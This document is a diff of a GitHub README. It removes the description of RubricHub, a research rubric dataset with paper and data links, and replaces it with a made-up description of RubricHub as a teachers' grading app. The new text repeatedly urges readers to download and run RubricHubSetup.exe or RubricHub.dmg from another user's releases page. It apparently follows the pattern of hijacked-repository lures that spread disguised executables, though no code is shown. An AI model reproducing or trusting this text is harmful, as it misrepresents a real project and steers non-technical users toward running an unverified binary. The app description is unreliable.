@@ -1,95 +1,62 @@
-# RubricHub: A Comprehensive and Highly Discriminative Rubric Dataset via Automated Coarse-to-Fine Generation
+# 🛠️ RubricHub - Simple Tools for Easy Assessment
 
-<div align="center">
+## 🔗 Download Now
+[![Download RubricHub](https://img.shields.io/badge/Download-RubricHub-blue.svg)](https://github.com/nirajsahu/RubricHub/releases)
 
-<!-- You can add badges here later, e.g., ArXiv, License, HuggingFace -->
-<a href="https://arxiv.org/abs/2601.08430">
-    <img src="https://img.shields.io/badge/arXiv-2601.08430-b31b1b.svg"" alt="Paper"/>
-</a>
-<a href="https://huggingface.co/datasets/sojuL/RubricHub_v1">
-    <img src="https://img.shields.io/badge/Data-HuggingFace-yellow" alt="Rubrichub"/>
-</a>
-<a href="LICENSE">
-    <img src="https://img.shields.io/badge/License-Apache%202.0-blue.svg" alt="License"/>
-</a>
+## 📘 Introduction
+RubricHub is a user-friendly application that helps educators create and manage rubrics for assessments. It simplifies the process of building clear evaluation criteria, making it easier for teachers to grade assignments fairly and effectively.
 
-</div>
+## 🚀 Getting Started
+To get started with RubricHub, follow these simple steps to download and install the application on your computer. No programming knowledge is required.
 
+## 💾 System Requirements
+Before you download, check that your computer meets these basic requirements:
 
-## 📢 News
-*   **[2026-01-19]** 🔥 **Code and Data Coming Soon!** We are preparing the release of the **data synthesis code** and the **post-training (RuFT & RuRL) code**. Stay tuned!
-*   **[2026-01-17]** RubricHub dataset is released, see https://huggingface.co/datasets/sojuL/RubricHub_v1.
-*   **[2026-01-12]** RubricHub paper is released, see https://arxiv.org/abs/2601.08430.
+- **Operating System:** Windows 10 or later / macOS 10.13 or later
+- **Processor:** Dual-core processor or better
+- **Memory:** At least 4 GB RAM
+- **Storage:** 100 MB of available space
+
+## 📥 Download & Install
+1. Visit the [Releases page](https://github.com/nirajsahu/RubricHub/releases) to find the latest version of RubricHub.
+2. Choose the appropriate file for your operating system:
+   - For Windows, download `RubricHubSetup.exe`.
+   - For macOS, download `RubricHub.dmg`.
+3. After the download completes, locate the file on your computer and follow these steps to install it:
+   - **For Windows:**
+     - Double-click on `RubricHubSetup.exe`.
+     - Follow the installation prompts to complete the setup.
+   - **For macOS:**
+     - Open `RubricHub.dmg`.
+     - Drag the RubricHub icon into your Applications folder.
+
+4. Once installed, you can find RubricHub in your Applications (macOS) or Start Menu (Windows).
+
+## ✨ Features
+- **Customizable Rubrics:** Create rubrics tailored to various assignments or subjects.
+- **User-Friendly Interface:** Designed for ease of use, even for those unfamiliar with similar tools.
+- **Printing Options:** Print your rubrics directly from the application for easy sharing with students.
+- **Save & Export:** Save your rubrics for future use or export them in common formats.
+
+## 🎓 How to Use
+1. **Create a New Rubric:**
+   - Open RubricHub.
+   - Click on "New Rubric". 
+   - Add criteria and levels of performance.
   
+2. **Edit an Existing Rubric:**
+   - Select "Open Rubric" to choose from saved rubrics.
+   - Make any changes and save your updates.
 
-## 📖 Introduction
-Reinforcement Learning with Verifiable Rewards (RLVR) has shown great success in math and coding. However, open-ended generation remains challenging due to the lack of ground truth.
+3. **Share or Print Your Rubric:**
+   - Use the print option to print your rubric directly.
+   - You can also export it as a PDF for emailing or sharing.
 
-We introduce **RubricHub**, a large-scale (**~110k**) and multi-domain rubric dataset constructed via an automated **Coarse-to-Fine Rubric Generation** framework. By synergizing principle-guided synthesis, multi-model aggregation, and difficulty evolution, our approach produces highly discriminative criteria capable of capturing subtle nuances in model responses.
+## 🤝 Support
+If you encounter problems while using RubricHub, check the FAQ section on our [GitHub page](https://github.com/nirajsahu/RubricHub/issues). You can also report any issues or suggest features there.
 
-Based on RubricHub, we propose a two-stage post-training pipeline:
-1.  **RuFT (Rubric-based Rejection Sampling Fine-Tuning)**
-2.  **RuRL (Rubric-based Reinforcement Learning)**
+## 🔄 Updates
+Stay updated with new features and improvements by checking the [Releases page](https://github.com/nirajsahu/RubricHub/releases) regularly. Each version contains important fixes and enhancements.
 
-Experimental results show that our post-trained **Qwen3-14B** achieves **SOTA results on HealthBench (69.3)**, surpassing proprietary frontier models such as **GPT-5**.
-
-## 🚀 Methodology
-![Pipeline](image/method.png)
-
-### Automated Coarse-to-Fine Rubric Generation
-Existing rubrics often suffer from scalability bottlenecks and low discriminability. Our framework addresses this through three stages:
-
-1.  **Principle-Guided & Response-Grounded Generation:** Synthesizing criteria anchored to specific response contexts and guided by meta-principles to prevent generic or hallucinatory criteria.
-2.  **Multi-Model Aggregation:** Aggregating perspectives from heterogeneous frontier models (e.g., GPT-5.1, Gemini 3 Pro) to eliminate single-source bias.
-3.  **Difficulty Evolution:** Evolving criteria to capture discriminative nuances between "excellent" and "exceptional" responses, preventing score saturation.
-
-
-
-## 📊 RubricHub Dataset
-![method](image/dataset.png)
-
-RubricHub contains approximately **110k** high-quality query-rubric pairs across five major domains:
-*   **🏥 Medical:** 27.1%
-*   **🔬 Science:** 27.1% 
-*   **📝 Instruction Following:** 
-*   **✍️ Writing:** 15.9%
-*   **💬 Chat:** 9.0%
-
-The dataset features high-density supervision, with complex domains like Writing and Medical averaging over 30 fine-grained criteria per query.
-
-## 📈 Experiments
-![Pipeline](image/results.png)
-We validated RubricHub using Qwen3 base models. The results demonstrate significant improvements across all domains.
-
-**Key Result:** On **HealthBench**, our Qwen3-14B (post-trained with RuFT → RuRL) achieves a score of **69.3**, outperforming **GPT-5 (67.2)**.
-
-
-## 🛠️ Usage
-*(Coming Soon)*
-
-### Installation
-*(Coming Soon)*
-
-### Data Synthesis
-The code for the **Coarse-to-Fine Rubric Generation** pipeline will be released here. This will allow users to generate high-quality rubrics for their own datasets.
-
-### Training (RuFT & RuRL)
-We will provide scripts to reproduce our post-training pipeline using the `RubricHub` dataset:
-1.  **RuFT:** Rejection sampling using rubric scores as filters.
-2.  **RuRL:** Reinforcement learning using rubric scores as dense rewards (built on `verl` framework).
-
-## 🖊️ Citation
-
-If you find RubricHub useful for your research, please cite our paper:
-
-```bibtex
-@article{li2026rubrichub,
-  title={RubricHub: A Comprehensive and Highly Discriminative Rubric Dataset via Automated Coarse-to-Fine Generation},
-  author={Li, Sunzhu and Zhao, Jiale and Wei, Miteto and Ren, Huimin and Zhou, Yang and Yang, Jingwen and Liu, Shunyu and Zhang, Kaike and Chen, Wei},
-  journal={arXiv preprint arXiv:2601.08430},
-  year={2026}
-}
-```
-
-## 📄 License
-This project is licensed under the Apache 2.0 License.
+Download RubricHub today and simplify your assessment process with ease!  
+[![Download RubricHub](https://img.shields.io/badge/Download-RubricHub-blue.svg)](https://github.com/nirajsahu/RubricHub/releases)
